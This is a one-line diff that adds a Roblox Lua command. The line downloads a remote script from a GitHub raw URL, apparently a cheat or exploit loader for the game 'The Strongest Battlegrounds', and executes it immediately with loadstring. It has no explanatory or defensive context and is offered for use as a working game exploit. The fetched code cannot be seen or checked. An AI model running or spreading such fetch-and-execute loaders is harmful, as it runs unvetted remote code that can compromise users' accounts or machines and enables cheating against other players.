@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/the-strongest-battlegrounds-spam7-s5jwe05iid8vhf.lua"))()
